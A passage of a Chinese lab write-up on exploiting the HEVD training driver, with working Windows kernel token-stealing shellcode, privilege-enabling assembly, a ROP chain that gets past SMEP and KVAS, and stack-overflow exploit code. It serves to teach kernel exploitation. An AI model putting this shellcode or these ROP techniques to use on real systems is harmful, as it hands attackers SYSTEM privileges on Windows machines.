使用下面的命令来查看对应的EPROCESS结构体，这里查看System进程的 1dt nt!_EPROCESS &lt;Process address&gt; Token是一个_EX_FAST_REF类型的Union值 RefCnt记录了Token引用的数目，是数据的低4位(64位中，32位是3位) 将当前进程的除RefCnt以外的其他bit位设置为和System的一致就行了， 这里 Value与掩码-0xd（RefCount）进行&amp;运算就能得到真实的Token值 现在将计算出的Token值复制给cmd.exe（这是一个新的Token） B. 进行Shellcode编写 在刚才的EPROCESS中，有一段记录的是程序的链表：ActiveProcessLinks，而且windows会生成一段独特的标识来标记每一个程序：UniqueProcessId，在这段 双向 链表上每段程序都可以被找到，因为可以向前和向后查找，一般System位于链表开头，所以沿着Flink查找 通过EPROCESS获得自身ActiveProcessLinks，同时向前/向后查找 这篇文章中通过模仿PsGetCurrentProcess，gs:[188h]指向的是一个_KTHREAD ，函数的汇编会将这个地址add addr,0xb8，就得到了当前进程的_EPROCESS，这也是许多shellcode的技巧 ffff9984d3d97080 就为一个 当前进程的KiInitialThread +0xB8指向的是当前进程的EPROCESS了 比较当前ActiveProcessLinks值-8的内存地址是否为UniqueProcessId 否：更换当前结构体为下一个 是：从ActiveProcessLinks-0x70的位置得到Token地址 解析Token，赋值给当前进程（Windows会自动解析为exp的程序（从页表映射等来看确实应该如此）） 仔细逆向会发现 那么在没有任何栈变动的情况下add rsp, 0x28就能恢复栈，但是我们只有了ROP，ROP链中存在两个ret和一个pop，抬栈了0x18，所以在shellcode中只需要add rsp, 0x10 同时HEVD的NT_STATUS使用RAX检测处理是否成功，所以要xor rax,rax 12345678910111213141516171819202122232425262728[Bits 64]_start: xor rax, rax mov rax, gs:[rax+0x188] mov rax, [rax+0xb8] ;rax = 当前EPROCESS mov r9, rax ;r9 = 当前EPROCESS mov rax, [rax+0x448] ;rax = 当前EPROCESS.List mov rax, [rax] ;rax = 当前EPROCESS.List-&gt;flink__loop: mov rdx, [rax-0x8] ;rdx = 上一个进程的 upid mov r8, rax ;r8 = 当前EPROCESS.List-&gt;flink mov rax, [rax] ;rax = 上一个进程的.List cmp rdx, 0x4 jnz __loop ;rdx = 4 ;r8 = System EPROCESS mov rdx, [r8+0x70] ;rdx = system token and rdx, -0x8 ;消除低4位 mov rcx, [r9+0x4b8] ;当前EPROCESS的token and rcx, 0x7 ; add rdx, rcx ;rdx = 系统token高位+当前token低4位 mov [r9+0x4b8], rdx ;将合成的token复制给当前 add rsp, 0x10 retn 使用nasm 1&amp; &quot;C:\\Users\\xxxx\\AppData\\Local\\bin\\NASM\\nasm.exe&quot; -f win64 .\\TokenSteal.asm -o .\\TokenSteal.bin 编译出的文件位COFF格式，要提取出来，这里我用的是CFF Explore的快速反汇编定位到代码然后用HxD提取的 123456789unsigned char cmd[84] = &#123; 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC1, 0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x50, 0xF8, 0x49, 0x89, 0xC0, 0x48, 0x8B, 0x00, 0x48, 0x83, 0xFA, 0x04, 0x75, 0xF0, 0x49, 0x8B, 0x50, 0x70, 0x48, 0x83, 0xE2, 0xF8, 0x49, 0x8B, 0x89, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x83, 0xE1, 0x07, 0x48, 0x01, 0xCA, 0x49, 0x89, 0x91, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x10, 0xC3&#125;; C. 分析上一篇的shellcode 12345678910111213141516171819202122232425262728BYTE cmd[256] = &#123; 0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b, 0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50, 0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49, 0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff&#125;; 写入一个二进制文档，用ida逆向 发现原理一致，最后对栈的恢复不同 已知gs:[0x188]指向一个_KTHREAD结构体 根据windbg的调试结果知道 12345678910mov cx, [rax+0x1e4] ;+0x1e4 KernelApcDisable : 0n-1inc cx ;mov [rax+0x1e4], cx ;更新KernelApcDisable为0mov rdx, [rax+0x90] ;+0x090 [TrapFrame]: 0xfffff88e`1d2edb00 ;_KTRAP_FRAME ;---下面为_KTRAP_FRAMEmov rcx, [rdx+0x168] ;[+0x168] Ripmov r11, [rdx+0x178] ;[+0x178] EFlagsmov rsp, [rdx+0x180] ;[+0x180] Rspmov rbp, [rdx+0x158] ;[+0x158] Rbp 可能还是有点😵，反汇编一下TrapFrame的RIP 相当于通过TrapFrame，替换了exp中的DeviceIoControl（模仿正常执行），并让他正常返回 接着重定位GS寄存器，使用sysret返回，为了对齐，有的汇编是这样的写的 1o64 sysret ; nasm shit D. 开启Token所有权限 [优化shellcode] 即使我们已经成功生成了令牌，但是功能依旧是不全的 被禁用的功能依旧有很多 I. 开启当前权限为启用 重新打开一个普通用户的cmd.exe 用A部分的方法找到该进程 查看token格式，对照一下SID。（注意低位要为0） 1!token &lt;Token数值，但是个位数为0&gt; 1dt !_sep_token_privileges 0xffffb106`ecc96060+0x40 将Enabled值设置为Present值 1eq 0xffffb106`ecc96060+0x40+8 0x00000006`02880000 查看权限 II. 获得所有权限并启用 用A部分的方法得到System的Token 再得到SystemToken的Present值 设置当前Token的Present和Enabled为该值 查看权限 III.重新编写shellcode 1234567891011121314151617181920212223242526272829303132333435363738[Bits 64]_start: xor rax, rax mov rax, gs:[rax + 0x188] mov rax, [rax + 0xb8] ;rax = 当前EPROCESS mov r9, rax ;r9 = 当前EPROCESS mov rax, [rax + 0x448] ;rax = 当前EPROCESS.List mov rax, [rax] ;rax = 当前EPROCESS.List-&gt;flink__loop: mov rdx, [rax - 0x8] ;rdx = 上一个进程的 upid mov r8, rax ;r8 = 当前EPROCESS.List-&gt;flink mov rax, [rax] ;rax = 上一个进程的.List cmp rdx, 0x4 jnz __loop ;rdx = 4 ;r8 = System EPROCESS mov rdx, [r8+0x70] ;rdx = system token and rdx, -0x8 ;消除低4位 mov rcx, [r9+0x4b8] ;当前EPROCESS的token and rcx, 0x7 ; add rdx, rcx ;rdx = 系统token高位+当前token低4位 mov [r9+0x4b8], rdx ;将合成的token复制给当前 ;Enable ALL mov rdx, [r8 + 0x70] ;rdx = system token and rdx, 0xFFFFFFFFFFFFFFF0 ;system token: 消除低8位，便于解析Token mov rbx, [rdx + 0x40] ;rbx = System token的Present mov rcx, [r9 + 0x4b8] ;rcx = 新的EPROCESS的token and rcx, 0xFFFFFFFFFFFFFFF0 ;new current token: 消除低8位，便于解析Token mov [rcx + 0x40], rbx mov [rcx + 0x48], rbx xor rax, rax add rsp, 0x10 retn KVAS A. 简介 KVAS全称是Kernel Virtual Address Shadow，它的出现与MeltDown（CVE-2017-5754）和TotalMeltDown（CVE-2018-1038）有关。 我的描述不一定准确，大致上来说这两个漏洞利用了CPU的乱序执行技术，即CPU在执行时不一定会按照流程执行。当我们访问一个不能被用户模式访问的内存页时，CPU会执行该语句然后将其缓存到内存中，等到发现不能访问后返回错误，但是该数据依旧存在于缓存当中。利用这种思路就可以完全读取内核中的数据，实现权限提升等。 微软为了缓解该漏洞，从用户页表中隔离出内核页表，让用户态访问到的内核页表也是经过映射的，并且会将用户页表自动标记为NX，让我们的shellcode无法执行 B. Bypass 虽然用户页表为不可执行，但是内核页表仍然可执行，只不过会延长我们ROP链的长度 需要用到的函数是：ExAllocatePoolWithTag和RtlCopyMemory ExAllocatePoolWithTag：用于在内核中开辟一块地址 RtlCopyMemory：复制内存到内核开辟的内存池 1234LPVOID space = ExAllocatePoolWithTag(0, 0x100, 0xDEAD);//NonPagedPoolExecute = 0//空间大小：0x100RtlCopyMemory(space, shellcode_addr, 0x100); MSDN中说明该两个函数在内核中均位于 NtosKrnl.exe里，我们可以利用第一章的内容寻找到该地址，可以使用CFF Explorer查看导出表找到函数 需要说明的一点是ExAllocatePoolWithTag有一个很恶心的地方就是 这三个mov会打乱我们精心设计的ROP链，而且后面根本没有使用到他，所以要直接进入push rdi的位置 RtlCopyMemory其实是一个宏 123unsigned long long base = ulGetKernelBase((PCHAR)&quot;ntoskrnl.exe&quot;);unsigned long long ulExAllocatePoolWithTag = base + 0x9B203F;unsigned long long ulRtlCopyMemory = base + 0x40BEC0; 根据微软的函数调用规则，传参顺序是rcx，rdx，r8，返回地参数在rax中 那么一个理想的ROP布局 1234567891011121314pop rcx rdx r8 ret00x1000xDEADExAllocatePoolWithTag---------------------------pop rcx rdx r8 ret0 ;暂时shellcode_addr0x100;mov rcx, rax ret ;此时rcx = ExAllocatePoolWithTag返回地内存地址RtlCopyMemory---------------------------jmp rax 就这些gadget中的pop会消除rsp+0x28的驱动的Handle函数返回地址，所以首先是抬栈，如sub rsp, 0x100，在jmp rax之前多次调用ret来抬升rsp的值，最终回到shellcode调整为适用的rsp值。 实际情况中也不会有恰好的gadget用 实际上能用的mov rcx, rax可以通过以下方式实现 1230x00000001408fa783 : push rax ; push rbx ; ret0x00000001408fa77b : push rax ; push rdi ; ret0x000000014020262C : pop rdi ; ret 这样就能让rcx=rax了，布局后栈的情况 1234ulExAllocatePoolWithTagpop_rdipop_rcxpush_rax_rdi pop rdi：RDI =pop rcx地址，出栈一个，rsp指向push_rax_rdi，然后ret跳转到该地址 push rax：将申请的内核内存地址放到了栈上，rsp指向值就为该内存的地址 push rdi; ret：等效于jmp rdi，于是ret到了pop rcx pop rcx：此时的栈顶为 2 中入栈的rax 成功让RCX=RAX 这里暂时设计payload 123456789101112131415161718192021//typedef unsigned long long funcaddr; *(funcaddr*)(stackspace + 0x818) = (funcaddr)pop_rcx; *(funcaddr*)(stackspace + 0x818 + 8) = (funcaddr)0; *(funcaddr*)(stackspace + 0x818 + 0x10) = (funcaddr)pop_rdx; *(funcaddr*)(stackspace + 0x818 + 0x18) = (funcaddr)0x100; *(funcaddr*)(stackspace + 0x818 + 0x20) = (funcaddr)pop_r8; *(funcaddr*)(stackspace + 0x818 + 0x28) = (funcaddr)0xDEAD; *(funcaddr*)(stackspace + 0x818 + 0x30) = (funcaddr)ulExAllocatePoolWithTag; *(funcaddr*)(stackspace + 0x818 + 0x38) = (funcaddr)pop_rdi; //rsp = 0 *(funcaddr*)(stackspace + 0x818 + 0x40) = (funcaddr)pop_rcx; //rdi = rcx --- been force to zero *(funcaddr*)(stackspace + 0x818 + 0x48) = (funcaddr)push_rax_rdi;//ret rdi: pop_rcx value changed *(funcaddr*)(stackspace + 0x818 + 0x50) = (funcaddr)pop_rdx; //此处被低位被清零 *(funcaddr*)(stackspace + 0x818 + 0x58) = (funcaddr)shellcode_addr; *(funcaddr*)(stackspace + 0x818 + 0x70) = (funcaddr)pop_r8; *(funcaddr*)(stackspace + 0x818 + 0x78) = (funcaddr)sizeof(cmd); *(funcaddr*)(stackspace + 0x818 + 0x80) = (funcaddr)ulRtlCopyMemory; *(funcaddr*)(stackspace + 0x818 + 0x88) = (funcaddr)jmp_rax; 但是进行ExAllocatePoolWithTag 打断了ROP链，让rsp+68的位置的低32位清零了，这让我们需要调整这段rop链 1234567*(funcaddr*)(stackspace + 0x818 + 0x50) = (funcaddr)pop_rdx; //此处被低位被清零*(funcaddr*)(stackspace + 0x818 + 0x58) = (funcaddr)shellcode_addr; *(funcaddr*)(stackspace + 0x818 + 0x60) = (funcaddr)pop_rdx; //恢复rdx*(funcaddr*)(stackspace + 0x818 + 0x68) = (funcaddr)shellcode_addr; *(funcaddr*)(stackspace + 0x818 + 0x70) = (funcaddr)pop_r8;*(funcaddr*)(stackspace + 0x818 + 0x78) = (funcaddr)sizeof(cmd); 在设置CR4.SMEP的情况下，依靠内核分配的内存，成功运行了shellcode，ROP链进行了多次调用，让最后shellcode中的rsp值不好估计，并且栈的情况可能随着函数的调用将原有的值抹去，这里先把shellcode换成从TrapFrame返回的 C. 优化shellcode 所以这段shellcode参考shellcode编写的C、D部分，加上了所有功能Enabled的shellcode片段 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[Bits 64]_start: xor rax, rax mov rax, gs:[rax + 0x188] mov rax, [rax + 0xb8] ;rax = 当前EPROCESS mov r9, rax ;r9 = 当前EPROCESS mov rax, [rax + 0x448] ;rax = 当前EPROCESS.List mov rax, [rax] ;rax = 当前EPROCESS.List-&gt;flink__loop: mov rdx, [rax - 0x8] ;rdx = 上一个进程的 upid mov r8, rax ;r8 = 当前EPROCESS.List-&gt;flink mov rax, [rax] ;rax = 上一个进程的.List cmp rdx, 0x4 jnz __loop ;rdx = 4 ;r8 = System EPROCESS mov rdx, [r8+0x70] ;rdx = system token and rdx, -0x8 ;消除低4位 mov rcx, [r9+0x4b8] ;当前EPROCESS的token and rcx, 0x7 ; add rdx, rcx ;rdx = 系统token高位+当前token低4位 mov [r9+0x4b8], rdx ;将合成的token复制给当前 ;Enable ALL mov rdx, [r8 + 0x70] ;rdx = system token and rdx, 0xFFFFFFFFFFFFFFF0 ;system token: 消除低8位，便于解析Token mov rbx, [rdx + 0x40] ;rbx = System token的Present mov rcx, [r9 + 0x4b8] ;rcx = 新的EPROCESS的token and rcx, 0xFFFFFFFFFFFFFFF0 ;new current token: 消除低8位，便于解析Token mov [rcx + 0x40], rbx mov [rcx + 0x48], rbx mov rax, gs:188h mov cx, [rax+1E4h] inc cx mov [rax+1E4h], cx mov rdx, [rax+90h] mov rcx, [rdx+168h] mov r11, [rdx+178h] mov rsp, [rdx+180h] mov rbp, [rdx+158h] xor eax, eax swapgs o64 sysret 得到shellcode 1234567891011121314151617unsigned char cmd[176] = &#123; 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC1, 0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x50, 0xF8, 0x49, 0x89, 0xC0, 0x48, 0x8B, 0x00, 0x48, 0x83, 0xFA, 0x04, 0x75, 0xF0, 0x49, 0x8B, 0x50, 0x70, 0x48, 0x83, 0xE2, 0xF8, 0x49, 0x8B, 0x89, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x83, 0xE1, 0x07, 0x48, 0x01, 0xCA, 0x49, 0x89, 0x91, 0xB8, 0x04, 0x00, 0x00, 0x49, 0x8B, 0x50, 0x70, 0x48, 0x83, 0xE2, 0xF0, 0x48, 0x8B, 0x5A, 0x40, 0x49, 0x8B, 0x89, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x83, 0xE1, 0xF0, 0x48, 0x89, 0x59, 0x40, 0x48, 0x89, 0x59, 0x48, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8B, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x66, 0xFF, 0xC1, 0x66, 0x89, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8A, 0x68, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x9A, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xA2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xAA, 0x58, 0x01, 0x00, 0x00, 0x31, 0xC0, 0x0F, 0x01, 0xF8, 0x48, 0x0F, 0x07&#125;; 缺点就是程序无法exit退出，不过可以在shellcode中设置Token迁移等一些其他操作，这里就不展开了 参考 https://wumb0.in/finding-the-base-of-the-windows-kernel.html https://github.com/xct/windows-kernel-exploits https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/ https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/ https://mdanilor.github.io/posts/hevd-2/","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"【Win Pwn】HEVD-内核栈溢出(中)","slug":"win-hevd-exp-stackoverflow-II","date":"2024-01-25T07:07:30.000Z","updated":"2025-01-26T14:46:00.752Z","comments":true,"path":"2024/01/25/win-hevd-exp-stackoverflow-II/","link":"","permalink":"https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/","excerpt":"在上一篇中了解了与内核的交互模式，这里就可以开始做HEVD了 文章已在先知社区投稿：https://xz.aliyun.com/t/13364","text":"在上一篇中了解了与内核的交互模式，这里就可以开始做HEVD了 文章已在先知社区投稿：https://xz.aliyun.com/t/13364 编写交互模块 A. 计算IO_CTL值 其实不用这步，但是可以当作更多的了解 在之前的交互中有这么一条定义功能号 1#define IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS) 但是…HEVD逆向会发现是这样的 发现CTL_CODE也是个宏定义 123#define CTL_CODE( DeviceType, Function, Method, Access ) ( \\ ((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \\) 其中，这里 DeviceType -&gt; FILE_DEVICE_UNKNOWN = 0x22 Function -&gt; = 0x9888 Method -&gt; METHOD_BUFFERED=0 Access -&gt; FILE_ANY_ACCESS=0 表达式就为 1234 (0x22 &lt;&lt; 16) | (0 &lt;&lt; 14) | ( 0x9888 &lt;&lt; 2) | 0= 0x220000 | 0 | 0x9888 &lt;&lt; 2 | 0= 0x220000 | 0x9888 &lt;&lt; 2= 0x226220 很容易得到逆向，这里以0x226220为例子 120x205B = 0x22205B ^ 0x2200000x816 = 0x205B&gt;&gt;2 那么对应的函数 123unsigned int io2num(unsigned int ioctl_num) &#123; return ((ioctl_num ^ 0x220000) &gt;&gt; 2) &amp; 0xfff;&#125; 后面之所以要&amp;一下是因为数据的大小就只有那么大，所以II文章的描述符0x9888实际有效的只有0x888 B. 功能选择 这里就以最简单的内核栈溢出举例子 每开始一个漏洞利用就编写一个菜单，然后选择解析逆向出来的功能描述符，运行对应函数，没啥好讲的 123456789101112131415161718192021222324252627282930313233void menu() &#123; cout &lt;&lt; &quot;============HEVD Hack EXP============\\n&quot;; cout &lt;&lt; &quot; 1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\\n&quot;; cout &lt;&lt; &quot;input io ctl&gt; &quot;;&#125;int main()&#123; HANDLE hDevice = NULL; hDevice = CreateFileW(L&quot;\\\\\\\\.\\\\My1DeviceLinker&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice == INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;Error Create File\\n&quot;; return 0; &#125; unsigned int io_ctl = 0; menu(); scanf_s(&quot;%x&quot;, &amp;io_ctl); printf(&quot;%x, %x&quot;, io_ctl, io2num(io_ctl)); switch (io_ctl) &#123; case 1: &#123; cout &lt;&lt; &quot;Now Excuting ...\\n&quot;; cout &lt;&lt; &quot;1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ****** ...\\n&quot;; // // EXP FUNCTION HERE // &#125; default: break; &#125;&#125; C. 简单与功能交互 这里要传一个空间和大小过去，这里用的到方式就是上一篇的IOCTL方式 这里我把所有的exp定义在exp.c 1234567void StackOverflow(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x50] = &quot;aaaaa\\0&quot;; unsigned int size = 0x30; DWORD info = 0; DeviceIoControl(hDevice, ioctl, stackspace, sizeof(DWORDLONG), &amp;size, sizeof(DWORDLONG), &amp;info, NULL); std::cout &lt;&lt; &quot;IO Complete\\n&quot;;&#125; 驱动定义了一个2048大小的栈空间v5，但是写入的空间是我们可以控制的，尝试触发漏洞 1234567891011121314void StackOverflow(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x1000] = &#123; 0 &#125;; unsigned int size = 0x1000; RtlFillMemory(stackspace, size, &#x27;A&#x27;); DWORD info = 0; DeviceIoControl(hDevice, ioctl, stackspace, size, NULL, 0, &amp;info, NULL); printf(&quot;info: %d\\n&quot;, info); std::cout &lt;&lt; &quot;IO Complete\\n&quot;;&#125; D. 开始调试 之前符号表好像没加载上，在windbg中，HEVD的描述符一般在同级文件夹下 1.sympath+ &lt;pdb文件物理机上的路径&gt; 然后再 1lm m HEVD 1x /D /f HEVD!* 下个断点 1bp HEVD!TriggerBufferOverflowStack 这里运行下不崩溃的 I. Windbg 调试常用 在使用Windbg调试内核驱动程序时，你可以使用以下命令查看内存地址： 64位查看内存 1dq &lt;内存地址&gt; L &lt;要查看的长度，长度是64位为一组&gt; 64位查看内存，单列显示，这在查看栈的情况是比较好用 1dqs &lt;内存地址&gt; L &lt;要查看的长度，长度是64位为一组&gt; 在某处添加断点 1bp &lt;内存虚拟地址&gt; 12bp &lt;模块名&gt;!&lt;函数名&gt;//bp: break point 如 bp HEVD!TriggerBufferOverflowStack 查看所有断点 1bl 快速反汇编，适合查看gadget 1u &lt;内存地址&gt; 反汇编该地址对应的一段汇编，适合反汇编这段函数后选择断点 12uf &lt;内存地址&gt;uf &lt;模块名&gt;!&lt;函数名&gt; 计算器 1? &lt;计算表达式&gt; II. 内存布局 1234567891011121314void StackOverflow(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x1000] = &#123; 0 &#125;; unsigned int size = 0x80; RtlFillMemory(stackspace, size, &#x27;A&#x27;); DWORD info = 0; DeviceIoControl(hDevice, ioctl, stackspace, size, NULL, 0, &amp;info, NULL); printf(&quot;info: %d\\n&quot;, info); std::cout &lt;&lt; &quot;IO Complete\\n&quot;;&#125; 如果引发溢出的话，看看kernel中的v5变量的布局 这里的kernelBuffer就相当于用户模式下的“栈帧” 同时可以看到我们程序的内存 这个时候顺便看一下rbp 在pop前下断点再运行到 所以是rsp+0x20+0x818就得到ret的地址 很明显这里可以通过栈溢出劫持返回地址，然后实现我们的shellcode III. 布置构思 首先 驱动是64位，所以要用64位的思维去布局 其次，驱动和我们的程序内存之间是能访问的，所以我们在Ring3写shellcode，然后覆盖到Ring0去执行 那么就是 1&quot;a&quot;*0x810+p64(shellcode_addr) Shellcode+exp编写 A. shellcode 主要是用这篇：Exploiting Windows 10 Kernel Drivers - Stack Overflow 或者里面参考的两篇 主要目的就是拿去Token然后替换掉一个cmd.exe的Token实现提权，在下一篇文章中会详细提到 This time around we will pass the PID into the shellcode, which means that our tweaked shellcode will look like this: 12345678910111213141516171819202122232425262728293031323334353637383940[BITS 64]push raxpush rbxpush rcxpush rsipush rdimov rax, [gs:0x180 + 0x8] ; Get &#x27;CurrentThread&#x27; from KPRCBmov rax, [rax + 0x220] ; Get &#x27;Process&#x27; property from current threadnext_process:cmp dword [rax + 0x2e0], 0x41414141 ; Search for &#x27;cmd.exe&#x27; process (&#x27;AAAA&#x27; replaced by exploit)je found_cmd_processmov rax, [rax + 0x2e8] ; If not found, go to next processsub rax, 0x2e8jmp next_processfound_cmd_process:mov rbx, rax ; Save our cmd.exe EPROCESS for laterfind_system_process:cmp dword [rax + 0x2e0], 0x00000004 ; Search for PID 4 (System process)je found_system_processmov rax, [rax + 0x2e8]sub rax, 0x2e8jmp find_system_processfound_system_process:mov rcx, [rax + 0x358] ; Take TOKEN from System processmov [rbx+0x358], rcx ; And copy it to the cmd.exe processpop rdipop rsipop rcxpop rbxpop rax; return goes here B. EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859void StackOverflow(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x1000] = &#123; 0 &#125;; char shellcode[256] = &#123; 0x50, 0x53, 0x51, 0x56, 0x57, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0x20, 0x02, 0x00, 0x00, 0x81, 0xb8, 0xe0, 0x02, 0x00, 0x00, 0x41, 0x41, 0x41, 0x41, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0xe8, 0x02, 0x00, 0x00, 0x48, 0x2d, 0xe8, 0x02, 0x00, 0x00, 0xeb, 0xe5, 0x48, 0x89, 0xc3, 0x83, 0xb8, 0xe0, 0x02, 0x00, 0x00, 0x04, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0xe8, 0x02, 0x00, 0x00, 0x48, 0x2d, 0xe8, 0x02, 0x00, 0x00, 0xeb, 0xe8, 0x48, 0x8b, 0x88, 0x58, 0x03, 0x00, 0x00, 0x48, 0x89, 0x8b, 0x58, 0x03, 0x00, 0x00, 0x5f, 0x5e, 0x59, 0x5b, 0x58, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff &#125;; DWORD oldProtect; STARTUPINFOA si; PROCESS_INFORMATION pi; unsigned int size = 0x820; RtlFillMemory(stackspace, 0x810, &#x27;A&#x27;); *(unsigned long long*)(stackspace + 0x818) = (unsigned long long)shellcode; DWORD info = 0; VirtualProtect(shellcode, 256, PAGE_EXECUTE_READWRITE, &amp;oldProtect); printf(&quot;[*] Spawning a new cmd.exe process\\n&quot;); si.cb = sizeof(STARTUPINFOA); if (!CreateProcessA(NULL, (LPSTR)&quot;cmd.exe&quot;, NULL, NULL, true, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi)) &#123; printf(&quot;[!] FATAL: Error spawning cmd.exe\\n&quot;); return; &#125; printf(&quot;[*] Updating our shellcode to search for PID %d\\n&quot;, pi.dwProcessId); 